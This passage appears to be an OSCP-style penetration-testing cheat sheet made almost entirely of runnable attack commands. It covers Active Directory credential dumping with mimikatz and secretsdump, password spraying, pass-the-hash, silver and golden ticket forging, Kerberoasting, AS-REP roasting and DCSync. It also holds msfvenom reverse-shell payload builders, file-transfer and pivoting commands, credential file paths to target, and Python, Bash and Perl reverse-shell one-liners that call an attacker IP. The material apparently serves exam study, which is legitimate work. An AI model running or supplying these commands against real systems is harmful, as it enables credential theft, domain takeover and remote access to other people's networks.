# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
```

### EvilWinRM (used when port 5985 is open)
```bash
#grab shell in attacker's kali
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38

#run mimikatz from evil-winrm
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

#run winPEAS
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe

#upload files
upload /root/notes.txt .
```

### Bloodhound

- Collection methods - database

```bash
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
      e.g. Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
```

- Running Bloodhound

```bash
sudo neo4j console
# then upload the .json files obtained

sudo bloodhound
# then upload the .zip files obtained
```

## **Attacking Active Directory Authentication**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
</aside>

### Tools to dump hashes (tool: secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

### Password Spraying

- Dump passwords from memory using mimikatz
```powershell
PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
```

-Dump passwords using impacket (try all user accounts that are found using net user /domain)
```bash
impacket-secretdump exam.com/apachesvc@192.168.1xx.101
```

- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
  ```bash
  #using LDAP and ADSI to perform a low and slow password attack against AD users
  .\Spray-Passwords.ps1
    .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
  ```
  
- Spray with known password on list of found usernames
```bash
# Crackmapexec uses SMB - check if the output shows 'Pwned!'
# --continue-on-success to avoid stopping at the first valid credentials.
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
        users.txt from Get-NetUser

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### Pass the hash (lateral movement) for NTLM only

- Access local SAM database and dump all local hashes
```powershell
PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
```

- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
```powershell
#dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
#dump credentials stored in LSASS and cache hashes
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Pass the hash

```bash
#using crackmapexec on kali to access x.105 and host in 192.168.57.0/24
crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
        crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local

#using wmiexec on kali
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
```bash
#output is a kerberos ticket
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

# Checking if the forged tickets is in memory
ps> klist

#get shell
psexec.exe -accepteula \\<remote_hostname> cmd  
```

### Pass the ticket
```bash
.\mimikatz.exe
sekurlsa::tickets /export

#obtain the newly generated ticket (latest timestamp)
dir *.kirbi
mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*
klist
dir \\web04\admin$
```

## PSexec (lateral movement)

```powershell
#FILE04 = target host, jen = user with access to FILES04
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Silver Tickets (Forge ticket)
- 3 ingredients: SPN password hash (of user account with access to Target SPN resource), Domain SID, Target SPN

-Silver Ticket Default Groups:
<aside>
Domain Users SID: S-1-5-21<DOMAINID>-513
Domain Admins SID: S-1-5-21<DOMAINID>-512
Schema Admins SID: S-1-5-21<DOMAINID>-518
Enterprise Admins SID: S-1-5-21<DOMAINID>-519
Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
</aside>

- In Windows, Mimikatz can be used to craft the ticket. Next, the ticket is injected with Rubeus, and finally a remote shell can be obtained thanks to PsExec.
  
- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID
```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369" i.e. omit RID of "1105"
```

- Forging silver ticket (TGS) Ft **Mimikatz**
<aside>
Forging a TGS (and included PAC)
Requires the machine account password (key) from the KDC
Can be used to directly access any service (without touching DC)
</aside>

```bash
mimikatz.exe
prvilege::debug
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
      kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
#using aeskey generate the Silver Ticket (TGS) and inject it into memory
kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME

# Checking if the forged tickets is in memory
ps> klist

#verify access to targeted SPN
iwr -UseDefaultCredentials http://web04
```

- Inject the ticket (not needed if the TGS is already loaded in current session)

```bash
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
```

- Obtain a shell

```bash
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
```

### Golden Ticket Ft **Mimikatz** (Forge ticket)
<aside>
Forging a TGT (and the included PAC)
Requires tje krbtgt key, the “master” encryption key from the KDC
Can be used to request any TGS from the Domain Controller
</aside>

```bash
#getting krbtgt (user: krbtgt, NTLM: krbtgt hash)
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

#using krbtgt hash via mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
        mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi

 #List tickets in memory
klist

#using krbtgt hash via Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

#After running above code to generate golden ticket, the golden ticket will be automaticallys submiited for current session
#to launch cmd using the current session validated by golden ticket
mimikatz # misc::cmd
mimikatz # misc::cmd whoami
```

### Kerberoasting [STEAL ticket]
<aside>
Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
Kerberoasting requires a valid domain account.
Three step process:
- Find SPN tied to user accounts through LDAP (service accounts)
- Request a TGS for each SPN
- Crack the TGS offline to recover the service account's password
</aside>

```bash
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

# cracking TGS hashes
hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
        hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
```

### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
- method 1
```bash
#automatically find kerberoastable users  in targeted Domain
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

#crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

- method 2 in Kali
```bash
#ip of DC (-dc-ip), credential of domain user (corp.com/pete), obtain TGS (-request)
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

#crack hash using hashcat 13100
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

- method 2 in Windows
```bash
#get SPN that you want to target
impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100

#requesting TGS ticket, i.e. .kirbi
PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
mimikatz # kerberos :: list /export

#crack hash using tgsrepcrack.py
/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
#crack hash using kirbi2john.py
python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
```

### Targeted Kerberoasting
- Condition: have GenericWrite or GenericAll permissions on another AD user account
- then, purposely set SPN for the targeted user
- then kerberoast the account
- then crack the hash using hashcat to get the clear password
- after attack, REMEMBER to delete the SPN

### AS-REP roasting
- Find user account with user account option "Do not require Kerberos preauthentication" ENABLED, then obtain their password thru AS-REP hashes
#### on Kali
```bash
# [KALI] find users (not user1) who "Do not require Kerberos preauthentication"
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1

# [KALI] hashcat with option 18200 for AS-REP, to obtain the plaintext password of user who "Do not require Kerberos preauthentication"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
```
#### on windows (use Rubeus)
```bash
#extract AS-REP hash
.\Rubeus.exe asreproast /nowrap

#copy to kali to run hash cat
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Targeted AS-REP roasting
- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash

### DCSync-Domain Controller Synchronization
- Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
- Hence, must have access to members of the Domain Admins, Enterprise Admins, and Administrators groups

#### DCSync On windows
```powershell
#output of lsadump::dcsync is NTLM hash of target user including Administrator
mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
```

#### DCSync on Kali
```bash
#192.168.50.70 = IP of Domain Controller, output is the hash of target user
impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

```

# MISC

## General tips
-  /tmp directory has all permission to create or delete any file, use it
-  If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
- If a user can run all command as root user, we can achieve root access by performing 'sudo su' or 'sudo bash'

## MSFVenom

### Check msfvenom payloads
```bash
msfvenom -l payloads
```

###
```bash
msfconsole
use exploit/multi/handler
set lhost x.x.x.x
set Iport 4444
exploit

#windows (stageless)
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > shell.asp

#Linux (stageless)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war > shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.jsp
```

### MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ 
```bash 
#Non-Meterpreter Binaries

#Staged Payloads for Windows
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#Stageless Payloads for Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#Staged Payloads for Linux
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#Stageless Payloads for Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#Non-Meterpreter Web Payloads
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

## Shell File Transfer Cheat Sheet
### [https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ ](https://steflan-security.com/shell-file-transfer-cheat-sheet/)
#### Hosting files
| Command  | Description |
| ------------- | ------------- |
| python -m SimpleHTTPServer [PORT] | Python HTTP Server modules |
| python3 -m http.server [PORT]	| Python HTTP Server modules |
| service apache2 start; systemctl start apache2;	| Apache web server, requires to place files in the /var/www/html/ directory |
| service nginx start; systemctl start nginx	| Nginx web server, requires to place files in or /usr/share/nginx/html or /var/www/html |
| php -S 0.0.0.0:PORT	| PHP builtin web server bundle |
| nc -q 0 -lvp 443 < file	| Netcat listener to transfer files |
| nc -nv IP_ADDR 443 < file	| Netcat command to send files |
| smbserver.py SHARE share_dir	| Impacket’s smbserver.py script simulates a SMB server |
| service smbd start; systemctl start smbd	| Linux Samba, a share has to be added to /etc/samba/smb.conf |
| service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd	| Services such as pure-ftpd and proftpd can be used to setup FTP servers |
| atftpd –daemon –port 69 ftp_dir	| The atftpd utility allows to easily setup a TFTP server |
| ruby -rwebrick -e’WEBrick::HTTPServer.new(:Port => PORT, :DocumentRoot => Dir.pwd).start’	| Ruby web server using the Web brick library |
| ruby -run -e httpd . -p [PORT]	| Ruby simple http server |
| “C:\Program Files (x86)\IIS Express\iisexpress.exe” /path:C: /port:PORT	| Microsoftg IIS Express |
| base64 file;	| Encoding the the file using base 64 and decoding it in the target machine |

#### Downloading files
| Command  | Description |
| ------------- | ------------- |
| wget http://ip-addr:port/file [-o output_file]	| Wget comes preinstalled with most Linux systems |
| curl http://ip-addr:port/file -o output_file	| Curl comes preinstalled with most Linux and some Windows systems |
| certutil -urlcache -split -f “http://ip-addr:port/file” output_file	| Certutil is a Windows builtin command line tool |
| powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file; | Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
| powershell -c (New-Object Net.WebClient).DownloadFile(‘http://ip-addr:port/file’, ‘output_file’)	| Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
| bitsadmin /transfer job /download /priority high http://IP_ADDR/file output_file	| Bitsadmin Windows command-line tool |
| nc -nv IP_ADDR 443 > file	| Netcat command to download files from a Netcat listener |
| nc -q 0-lvp 443 > file	| Netcat listener to receive files |
| copy \IP_ADDR\SHARE\output_file	| Copy command to download files from an SMB share |
| smbget smb://domain;user[:password@]server/share/path/file	| smbget utility to download files from a Samba share |
| wget ftp://user:password@IP_ADDR/path/file -o output_file | wget stuff via FTP |
| - FTP | FTP |
| echo open 192.168.1.64 21> ftp.txt | FTP |
| echo anonymous>> ftp.txt | FTP |
| echo ftp@ftp.com>> ftp.txt | FTP |
| echo bin >> ftp.txt | FTP |
| echo get test.txt >> ftp.txt | FTP |
| echo bye >> ftp.txt | FTP |
| ftp -s:ftp.txt	| Wget and FTP to download files from an FTP server |
| tftp |	tftp -i IP_ADDR {GET | PUT} file |
| scp /path/file username@IP_ADDR:/path/file	| Secure File Copy SSH tool |
| https://gist.github.com/Richienb/51021a1c16995a07478dfa20a6db725c	| Windows Virtual Basic scripts |
| php -r “file_put_contents(‘output_file’, fopen(‘http://ip-addr:port/file’, ‘r’));”	| PHP file_put_contents function |
| python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’; | The Python urlretrieve function which is part of the urllib library can be used to download files |
| python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’	| The Python urlretrieve function which is part of the urllib library can be used to download files |
| perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’; | Library for WWW in Perl |
| perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’	| Library for WWW in Perl |
| ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
| echo -n “base64-output” > file	| Decoding the base64 output of the file |

## Windows File Transfers with SMB
- https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
```bash
#on kali
impacket-smbserver.py shareName sharePath

#on windows
##connect
C:\>net use
C:\>net use \\[host]\[share name]
##copy
C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
```

## Pivoting for lateral movement
- https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
### Using Chisel
- https://blog.mkiesel.ch/posts/oscp_pivoting/
- https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot

```bash
#On your attacking machine (192.168.60.200) setup a Chisel server with:
#PORT = port for the Chisel traffic
#socks5 = to setup a SOCKS5 proxy
#reverse = to tell Chisel to wait for a connection from a client
chisel server --port 1080 --sock5 --reverse

#On your attacking machine edit the file /etc/proxychains4.conf #1080 is the sock5 port
#Chisel
#1080 is the default port of the Chisel reverse proxy
socks5 127.0.0.1 1080

#on windows jumphost, setup Chisel Client with:
#IP = The IP address of your Chisel server
#PORT = The port you set on your Chisel sever
#R:socks = enables the reverse SOCKS proxy
#max-retry-count 1 = to exit Chisel when you kill your server
.\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 R:socks

#You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
#The traffic flows into port 1080 on your machine and out on your jump host, which has established a connection back to your listener on the port you specified when executing chisel server
proxychains -q nmap -sC -sV 10.0.60.99
proxychains -q ssh user@10.0.60.99
proxychains -q mysql -u dbuser -h 10.0.60.99
proxychains -q impacket-smbexec domain\user: -target-ip  10.0.60.99
proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''

#or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
```

## compiling windows exploit on kali
```bash
#compile C code
gcc -o syncbreeze_exploit.exe exploit.c

#compile 32 bit
apt install mingw-w64
i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32

#compile 64 bit
$ gcc i686-w64-mingw32-gcc exploit.c -o exploit.exe
```

## Post exploitation evidence
```bash
cat /root/proof.txt
whoami
ip a

type local.txt
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
systeminfo
ipconfig
```
## Permissions
```bash
#modifying permissions
chmod 600 id_rsa
chmod a+x ./linpeas.sh
```

## ssh operations
```bash
##connect to ssh
ssh -i id_rsa daniela@192.168.50.244

##cracking ssh passphrase
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

## Hydra
```bash
# http POST-form cracking (login forms), brute force username and password
hydra -l USERNAME -P /path/to/wordlist http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed text"

#bruteforce password only
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -1 admin -P /usr/share/wordlists/rockyou. txt -vV -f![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/a78ffd2d-a33b-4f53-8574-9b6a4a7f4c40)
```

## files of interest
- In the case where there is a LFI, and you cannot gain command execution try looking for interesting files which might contain credentials to help you move forward.

```bash
#Linux Interesting Files
/etc/passwd <- see which users are on the box
SSH keys <- using the information from above, check to see if there are any LFI keys
    - default location: /home/user/.ssh/id_rsa
/var/lib/tomcatX/tomcat-users.xml <- replace x with the tomcat version installed, and see if there are any credentias
```

```bash
#windows interesting files
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

## Useful NSE scripts
```bash
#smb-vuln-ms08-067
nmap --script-args=unsafe=1 --script smb-vuln-ms08-067.nse -p 445 <host>

#http-shellshock
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/{location},cmd=ls <target>
```

## /etc/crontab vs crontab
- /etc/crontab
  - Contains everything in one place
  - Only root can edit
  - Able to view which user is running what cron
  - /etc/crontab is public, and readable by anyone
 
- /var/spool/cron/crontab/{user}
  - Users are allowed to create their own cron jobs
  - Only root can edit crontab for user
  - Cron job is private unlike /etc/crontab

## starting and confirming SSH service
```bash
# To start it
sudo systemctl start ssh

#To confirm that the service is running
sudo ss -antlp | grep sshd
```

## port forwarding
- https://docs.gorigorisensei.com/port-forwarding

## upgrade shell
- https://fareedfauzi.gitbook.io/oscp-playbook/reverse-shell/interactive-ttys-shell
- https://github.com/pythonmaster41/Go-For-OSCP
- https://www.schtech.co.uk/linux-reverse-shell-without-python/
- https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet

```bash
#Python
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

#non python shell (not 100%)
#This will break you out of the pseudo terminal and into a tty shell, you can then su and carry out all other terminal based commands
/usr/bin/script -qc /bin/bash /dev/null
stty raw -echo; fg; reset

#Bash
echo os.system('/bin/bash')
/bin/sh -i
exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done

#Perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#Ruby:
ruby: exec "/bin/sh"

#Lua
lua: os.execute('/bin/sh')

#From within IRB
exec "/bin/sh"

#From within vi
:!bash

#From within vi
:set shell=/bin/bash:shell

#From within nmap
!sh
```

- SHELL=/bin/bash script -q /dev/null    #Upgrade from shell to bash.
- python3- c 'import pty;pty.spawn("/bin/sh")'        #Python PTY Module
- stty raw -echo      #Fully Interactive TTY
